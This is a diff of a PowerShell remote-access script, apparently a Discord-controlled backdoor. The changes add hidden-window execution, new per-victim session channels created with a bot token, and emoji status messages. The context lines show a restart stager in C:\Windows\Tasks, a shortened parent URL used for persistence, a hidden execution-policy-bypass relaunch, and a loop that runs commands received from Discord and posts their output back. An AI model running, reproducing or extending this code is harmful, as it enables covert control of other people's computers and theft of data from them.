@@ -6,14 +6,16 @@ $chan = "$ch" # make sure the bot AND webhook can access this channel
 
 # =============================================================== SCRIPT SETUP =========================================================================
 
+$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$spawnChannels = 1 # Create new channel on session start
+$InfoOnConnect = 1 # Generate client info message on session start
+$parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
+
 $version = "1.5.1" # Check version number
 $response = $null
 $previouscmd = $null
 $authenticated = 0
 $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
-$parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
-$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
-$InfoOnConnect = 1
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
@@ -1118,7 +1120,7 @@ $script:jsonPayload = @{
     tts        = $false
     embeds     = @(
         @{
-            title       = "$env:COMPUTERNAME | Waiting to connect "
+            title       = ":hourglass: $env:COMPUTERNAME | Waiting to connect :hourglass:"
             "description" = @"
 Enter **$env:COMPUTERNAME** in chat to start the session     
 "@
@@ -1138,9 +1140,9 @@ $script:jsonPayload = @{
     tts        = $false
     embeds     = @(
         @{
-            title       = "$env:COMPUTERNAME | Session Closed "
+            title       = " $env:COMPUTERNAME | Session Closed "
             "description" = @"
-**$env:COMPUTERNAME** Closing session     
+:no_entry: **$env:COMPUTERNAME** Closing session :no_entry:     
 "@
             color       = 16711680
             footer      = @{
@@ -1159,9 +1161,8 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 } else {
     $adminperm = "True"
 }
-
 if ($InfoOnConnect -eq '1'){
-    $infocall = 'Getting system info - please wait..'
+    $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
 }
 else{
     $infocall = 'Type `` Options `` in chat for commands list'
@@ -1328,10 +1329,16 @@ WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch=
 }
 
 Function Authenticate{
-    if (($response -like "$env:COMPUTERNAME") -or ($response -like "ControlAll")) {
+    if (($response -like "$env:COMPUTERNAME") -or ($response -like "$env:COMPUTERNAME*") -or ($response -like "ControlAll")) {
         Write-Host "Authenticated $env:COMPUTERNAME"
         $script:authenticated = 1
         $script:previouscmd = $response
+        if (($response -like "ControlAll") -or ($response -like "$env:COMPUTERNAME -nonew")){
+            $spawnChannels = 0
+        }
+        if ($spawnChannels -eq 1){
+            NewChannel
+        }
         ConnectMsg
     }
     else{
@@ -1339,6 +1346,52 @@ Function Authenticate{
         $script:authenticated = 0
         $script:previouscmd = $response
     } 
+}
+
+Function getGuildID{
+
+$headers = @{
+    'Authorization' = "Bot $token"
+}
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", $headers.Authorization)
+    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan")
+    $channel_info = $response | ConvertFrom-Json
+    $script:gid = $channel_info.guild_id
+}
+
+Function NewChannel{
+    $script:oldChan = $chan
+    $uri = "https://discord.com/api/guilds/$gid/channels"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", "Bot $token")
+    $response = $webClient.DownloadString($uri)
+    $channels = $response | ConvertFrom-Json
+    $topSession = 0
+    
+    foreach ($channel in $channels) {
+        if ($channel.name -match "session-(\d+)") {
+            $sessionNumber = [int]$matches[1]
+            if ($sessionNumber -gt $topSession) {
+                $topSession = $sessionNumber
+            }
+        }
+    }
+    $topSession
+    $newSessionNumber = $topSession + 1;
+    $uri = "https://discord.com/api/guilds/$gid/channels"
+    $body = @{
+        "name" = "session-$newSessionNumber"
+        "type" = 0
+    } | ConvertTo-Json
+    
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Headers.Add("Authorization", "Bot $token")
+    $webClient.Headers.Add("Content-Type", "application/json")
+    $response = $webClient.UploadString($uri, "POST", $body)
+    $responseObj = ConvertFrom-Json $response
+    Write-Host "The ID of the new channel is: $($responseObj.id)"
+    $script:chan = $responseObj.id
 }
 
 # =============================================================== MAIN LOOP =========================================================================
@@ -1350,6 +1403,7 @@ while($connected -eq 0){
 	PullMsg
         $previouscmd = $response
         VersionCheck
+        GetGuildId
         WaitingMsg
  	sleep 1
         $connected = 1
@@ -1378,7 +1432,8 @@ while($true){
             if ($response -like "Pause") {
                 $script:authenticated = 0
                 $previouscmd = $response
-		$InfoOnConnect = 0
+                $InfoOnConnect = 0
+                $script:chan = $oldchan
                 sendMsg -Message ":pause_button: ``Session Paused..`` :pause_button:"
                 WaitingMsg
             }
@@ -1391,7 +1446,7 @@ while($true){
                     $script:previouscmd = $response
                     sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
                     sleep -m 250
-		    $dir = $PWD.Path
+                    $dir = $PWD.Path
                     sendMsg -Message "``PS | $dir>``"
                 }
                 else {
@@ -1415,7 +1470,7 @@ while($true){
                         sendMsg -Message "``````$($batch -join "`n")``````"
                         sleep -m 250
                     }
-		    $dir = $PWD.Path
+                    $dir = $PWD.Path
                     sendMsg -Message "``PS | $dir>``"
                 }
             }
